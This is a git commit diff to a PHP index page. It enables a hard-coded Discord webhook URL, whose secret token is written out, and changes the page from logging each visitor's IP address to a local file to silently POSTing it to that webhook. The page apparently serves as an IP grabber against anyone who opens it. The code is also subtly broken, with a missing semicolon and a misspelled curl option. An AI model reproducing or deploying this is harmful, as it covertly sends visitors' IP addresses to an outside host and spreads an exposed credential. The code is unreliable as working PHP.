d3c6f8ba230af35e31aad315d1914725433455c1
kreapet <67609028+kreapet@users.noreply.github.com>
2021-05-23 12:34:45 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,10 +1,15 @@
 <?php
-// $webhookurl = "https://discord.com/api/webhooks/845950238719213608/OlWrovNwzQIgXHqGL1zlw5AyeMUg5M_QtCfXNqs7zDI1zlIv1gml_aET2InT6iBXyuaf";
+$webhookurl = "https://discord.com/api/webhooks/845950238719213608/OlWrovNwzQIgXHqGL1zlw5AyeMUg5M_QtCfXNqs7zDI1zlIv1gml_aET2InT6iBXyuaf";
 $ip= $_SERVER['REMOTE_ADDR'];
-
-$file = "ips.txt";
-$text = file_get_contents($file);
-$text .= $ip . "\n";
-file_put_contents($file, $text);
-
+$msg = "$ip";
+$json_data = array ('content'=>"$msg");
+$make_json = json_encode($json_data);
+$ch = curl_init( $webhookurl );
+curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+  curl_setopt( $ch, CURLOPT_POST, 1);
+  curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
+  curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
+  curl_setopt( $ch, CURLOPT_HEADER, 0);
+  curl_setopt( $ch, CURLOPT_RETURNTRANSTER, 1);
+$response = curl_exec( $ch )
 ?>
